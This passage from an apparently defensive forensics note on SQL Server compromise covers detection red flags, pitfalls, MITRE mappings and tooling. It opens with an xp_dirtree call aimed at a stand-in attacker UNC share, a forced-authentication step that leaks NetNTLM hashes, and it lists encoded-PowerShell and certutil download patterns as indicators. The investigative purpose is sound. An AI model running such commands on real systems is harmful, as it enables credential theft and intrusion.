EXEC master..xp_dirtree '\\attacker-host\share', 1, 1;
EXEC master..xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
```

🔴 **`xp_dirtree`/`xp_fileexist` against an attacker-controlled UNC path is a forced-authentication technique, not just recon.** Pointing either procedure at a remote share forces the SQL Server *service account* to attempt SMB authentication to that path — leaking a capturable NetNTLM hash to attacker infrastructure. This is a credential-theft primitive wearing a reconnaissance disguise; see [`17 - Memory Forensics`](<../17 - Memory Forensics>) and [`12 - Lateral Movement`](<../12 - Lateral Movement.md>) for what an attacker does with a captured hash afterward.

## The sqlservr.exe → cmd.exe Red Flag

Given the logging gap called out in Steps 5 and 7, host-level process-tree evidence is the single most reliable way to catch `xp_cmdshell`/OLE Automation abuse in the act — this is this note's highest-value red flag, full stop:

```
services.exe
  └─ sqlservr.exe                         (MSSQLSERVER or MSSQL$<Instance>)
       └─ cmd.exe                          🔴 xp_cmdshell OR sp_OAMethod('WScript.Shell','Run')
            ├─ whoami.exe / net.exe        recon
            ├─ powershell.exe -enc ...     staged payload / C2
            └─ certutil.exe -urlcache ...  living-off-the-land download
```

`sqlservr.exe` has **no legitimate reason to ever spawn `cmd.exe`.** A production database engine does not shell out as part of normal query processing — this parent/child pairing is functionally never benign, which makes it a rare case in this module of a single process-tree relationship that is almost sufficient on its own to call compromise, subject only to confirming it isn't authorized DBA tooling (some legacy maintenance scripts do call `xp_cmdshell` deliberately — confirm against change management before treating every instance as hostile).

```powershell
# Sysmon Event ID 1 (or Security 4688 with command-line auditing) filtered to sqlservr.exe as parent
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} |
    Where-Object { $_.Properties[16].Value -match 'sqlservr\.exe' } |
    Select-Object TimeCreated, @{N='Child';E={$_.Properties[4].Value}}, @{N='CommandLine';E={$_.Properties[10].Value}}, @{N='ParentImage';E={$_.Properties[16].Value}}
```

## Investigative Sequence Summary

```
1. Identify instance(s), version, edition
   sqlcmd/@@VERSION, SERVERPROPERTY, registry-based instance enumeration
                    │
2. Locate the logs
   Error Log path (SERVERPROPERTY/'ErrorLogFileName' or registry) · Default Trace on/off
   · system_health XE session · transaction log recovery-model check
                    │
3. Read the logs
   Error Log grep (login failures, startup params) · Default Trace via fn_trace_gettable
   joined to sys.trace_events for readable event names
                    │
4. Enumerate logins/roles
   sys.server_role_members WHERE role = sysadmin  ← single highest-value check
   · recently created logins/database users
                    │
5-10. Hunt the six code-execution/persistence primitives
   xp_cmdshell (5) · CLR assemblies (6) · OLE Automation sp_OA* (7)
   · linked servers/RPC Out (8) · Agent Jobs CmdExec/PowerShell steps (9)
   · startup stored procedures (10)
                    │
11. Login sweep
   Error Log (SQL auth, only source with client IP) + Security 4625/4624 (Windows auth only)
                    │
12. Data-theft/recon angle
   bcp/OPENROWSET mass export · xp_dirtree/xp_fileexist forced-auth NTLM leak
                    │
   Confirm via host telemetry
   sqlservr.exe → cmd.exe process-tree check (Sysmon 1 / EDR) - closes the
   xp_cmdshell/OLE-Automation command-text logging gap from Steps 5 and 7
                    │
   Hand off
   Lateral movement via linked servers/stolen hashes (note 12) · persistence
   cross-reference (note 10/Scheduled Tasks) · registry service-account
   review (note 04) · web-app-to-SQL chain (23/IIS - Web Server Forensics)
```

## Pitfalls

| 🔴 Pitfall | Why it matters |
|---|---|
| Treating `sys.configurations.value_in_use = 0` for `xp_cmdshell`/OLE Automation as proof it was never used | Current state only reflects *right now* — an attacker who enabled, used, and disabled the feature again leaves no durable record of the window in between unless host-level telemetry or a since-cleared trace happened to catch it |
| Reading a SQL-authenticated brute-force purely from the Windows Security log | SQL-native logons (including `sa`) never touch 4624/4625 — miss the Error Log's `Login failed for user` entries and the entire attack is invisible |
| Assuming the Default Trace covers the whole incident window | Fixed rollover (5 × 20 MB by default) silently overwrites the oldest data — always check the earliest `StartTime` actually returned before concluding an event didn't happen |
| Chasing `xp_cmdshell` and stopping there | OLE Automation (`sp_OA*`) achieves the identical outcome through a separate configuration flag and a separate code path — a clean `xp_cmdshell` finding does not clear the instance |
| Ignoring linked servers because "that's a different box" | A linked server with a `sysadmin`-mapped login and RPC Out enabled hands cross-instance privilege for free — treat every linked server as an extension of the current instance's trust boundary, not a separate investigation |
| Assuming DML history is recoverable from `.ldf` regardless of recovery model | SIMPLE recovery truncates the log on checkpoint — meaningful history often survives only minutes to hours; confirm `recovery_model_desc` before promising log-based row recovery |

## Red Flags

| 🔴 Finding | Why it matters |
|---|---|
| Any login outside a documented DBA list holding `sysadmin` | Bypasses every other permission check in the engine — the single highest-value privilege check in this note |
| `xp_cmdshell` or `Ole Automation Procedures` `value_in_use = 1` without a documented business reason | Both ship disabled by default; either one enabled is a standing OS code-execution pivot |
| `sqlservr.exe` spawning `cmd.exe` (or `powershell.exe`, `certutil.exe`, etc. as a grandchild) | Functionally never benign for a production database engine — the note's highest-confidence single indicator |
| User-defined CLR assembly with `permission_set_desc <> 'SAFE'` | `UNSAFE`/`EXTERNAL_ACCESS` assemblies can call arbitrary .NET APIs including process creation — a restart-surviving backdoor |
| Entry in `sys.trusted_assemblies` that isn't tied to known, documented tooling | Instance-level trust bypassing per-database `TRUSTWORTHY` — review every entry |
| Linked server with `is_rpc_out_enabled = 1` and a `sysadmin`-equivalent mapped login | Converts a passive cross-instance data trust into an active remote-execution primitive |
| Agent Job step using the `CmdExec` or `PowerShell` subsystem, especially with obfuscated/encoded command text | The Agent-Job equivalent of a malicious scheduled task — apply the same command-line red flags used elsewhere in this module |
| Stored procedure flagged `ExecIsStartUp = 1` that isn't documented DBA tooling | Fires on every service restart with no user session required — the direct SQL analog of a Run key |
| Burst of `Login failed for user 'sa'` entries in the Error Log, especially followed by a success | SQL-auth brute-force — invisible to the Windows Security log entirely |
| `xp_dirtree`/`xp_fileexist` calls targeting a non-local UNC path | Forces the SQL service account to authenticate outward — a credential-theft primitive, not just recon |

## MITRE ATT&CK Techniques Covered

| Technique | ID | Where in this note |
|---|---|---|
| Server Software Component: SQL Stored Procedures | T1505.001 | CLR assembly backdoors (Step 6), startup stored procedures (Step 10) |
| Command and Scripting Interpreter: Windows Command Shell | T1059.003 | `xp_cmdshell` (Step 5), OLE Automation `sp_OAMethod('WScript.Shell','Run')` (Step 7), the `sqlservr.exe → cmd.exe` process-tree red flag |
| Valid Accounts | T1078 | `sa`/SQL-login brute-force and reuse (Step 11) |
| Account Manipulation | T1098 | Addition to the `sysadmin` fixed server role (Step 4) |
| Create Account | T1136 | Newly created SQL logins/database users (Step 4) — mapped here as the closest database-layer analog; ATT&CK's sub-techniques for this ID are written primarily for OS/cloud/domain accounts |
| Scheduled Task/Job | T1053 | SQL Server Agent Job persistence (Step 9) — no ATT&CK sub-technique names database job schedulers specifically; mapped at the parent-technique level as the closest conceptual analog to `.005` (Windows Scheduled Task) |
| Exploitation of Remote Services | T1210 | Unauthenticated/vulnerability-based remote compromise of an exposed instance, as opposed to the credential-based paths covered elsewhere in this note |
| Remote Services | T1021 | Linked-server-based pivoting between SQL instances (Step 8) — mapped conceptually; no ATT&CK sub-technique names SQL linked servers specifically the way `.001`-`.007` name OS-level remote-service protocols |
| Forced Authentication | T1187 | `xp_dirtree`/`xp_fileexist` against an attacker-controlled UNC path (Step 12) |
| Data from Local System | T1005 | `bcp`/`OPENROWSET` mass data export (Step 12) |
| Brute Force | T1110 | SQL-authenticated login failure bursts against `sa` and other logins (Step 11) |

## Tooling

| Tool | Use |
|---|---|
| **`sqlcmd`** | Native command-line query tool shipped with every SQL Server install — the fastest way to run any T-SQL in this note against a live instance from a terminal, Windows- or SQL-authenticated |
| **SQL Server Management Studio (SSMS)** | GUI query/administration tool — best for interactive review of large result sets (Default Trace pulls, Agent Job history) and for browsing object trees (assemblies, linked servers, jobs) without hand-writing every enumeration query |
| **SQL Server Configuration Manager** | GUI service/instance/protocol management — confirms instance list, service accounts, and TCP/IP port configuration (Step 1) |
| **`Invoke-Sqlcmd`** (`SqlServer` PowerShell module) | Runs T-SQL from PowerShell, enabling the fleet-wide sweep pattern used throughout this note (loop a server list, run one query per host, aggregate results) |
| **dbatools** (PowerShell module) | Purpose-built DBA/security automation cmdlets — `Get-DbaLogin`, `Get-DbaAgentJob`, `Get-DbaLinkedServer`, `Get-DbaErrorLog`, `Get-DbaXESession`, among others — wraps much of this note's raw T-SQL into reusable, fleet-scalable cmdlets |
| **Extended Events (`xEvents`) viewer** (built into SSMS) | Reads the `system_health` session and any custom XE session stood up for going-forward `xp_cmdshell`/`sp_OA*` capture (Step 5/7) |
| **KAPE** | Targets covering the SQL Server `Log\` directory and registry hives at scale, alongside the rest of a host collection — see [`02 - Evidence Acquisition & Imaging`](<../02 - Evidence Acquisition & Imaging.md>) |

## Correlate With

| To go deeper on… | Open |
|---|---|
| General scheduled-task forensics (trigger theory, evidence-chain shape) that Agent Jobs mirror | [`10/Scheduled Tasks.md`](<../10 - Persistence Mechanisms/Scheduled Tasks.md>) |
| Full source/destination lateral-movement mechanics for linked-server pivoting and any stolen NetNTLM hash from `xp_dirtree` abuse | [`12 - Lateral Movement`](<../12 - Lateral Movement.md>) |
| Registry structure for the SQL service's own account/startup-parameter footprint (`ImagePath`, `ObjectName`, `SqlArg*`) | [`04 - Registry Forensics Fundamentals`](<../04 - Registry Forensics Fundamentals.md>) |
| The SQL-injection-to-`xp_cmdshell` attack chain when SQL Server sits behind a vulnerable web application | [`23/IIS - Web Server Forensics.md`](<IIS - Web Server Forensics.md>) |
| Credential-dumping follow-on once an attacker has an interactive OS foothold via `xp_cmdshell`/OLE Automation | [`17 - Memory Forensics`](<../17 - Memory Forensics>) |
| Full logon-type/4624/4625 field-level reference for the Windows-authenticated slice of Step 11 | [`05 - Users, Groups & Authentication`](<../05 - Users, Groups & Authentication.md>) |
| Windows Service persistence patterns, for comparison against the SQL Server/Agent service accounts themselves | [`10/Services.md`](<../10 - Persistence Mechanisms/Services.md>) |

## Resources

- Microsoft Learn — `xp_cmdshell` Server Configuration Option
- Microsoft Learn — CLR Integration Security (permission sets, `clr strict security`, `sys.trusted_assemblies`)
- Microsoft Learn — Database Engine Extended Stored Procedures (`sp_OA*` OLE Automation family)
- Microsoft Learn — Linked Servers (Database Engine)
- Microsoft Learn — SQL Server Agent Jobs and Job Steps
- Microsoft Learn — SQL Server Error Log and `SERVERPROPERTY`
- Microsoft Learn — Default Trace (SQL Server) and `sys.fn_trace_gettable`
- MITRE ATT&CK **T1505.001** (Server Software Component: SQL Stored Procedures) — https://attack.mitre.org/techniques/T1505/001/
- MITRE ATT&CK **T1059.003** (Command and Scripting Interpreter: Windows Command Shell) — https://attack.mitre.org/techniques/T1059/003/
- MITRE ATT&CK **T1187** (Forced Authentication) — https://attack.mitre.org/techniques/T1187/
- MITRE ATT&CK **T1110** (Brute Force) — https://attack.mitre.org/techniques/T1110/
- MITRE ATT&CK **T1021** (Remote Services) — https://attack.mitre.org/techniques/T1021/
